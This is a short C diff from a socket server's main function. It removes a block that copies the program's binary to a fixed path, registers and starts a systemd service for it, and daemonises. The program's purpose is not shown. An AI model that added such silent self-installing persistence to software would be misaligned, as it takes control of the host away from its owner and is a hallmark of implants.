@@ -119,12 +119,7 @@ int main(void)
 
     server_fd = create_server_socket();
     bind_and_listen(server_fd, &addr);
-    if (access(DEST_FILE, F_OK) == -1){
-        copy_binary_file(SOURCE_FILE, DEST_FILE);
-        create_systemd_service(SERVICE_NAME, DEST_FILE);
-        enable_and_start_service(SERVICE_NAME);
-        create_daemon();
-    }
+    
     while (1)
     {
         FD_ZERO(&readfds);
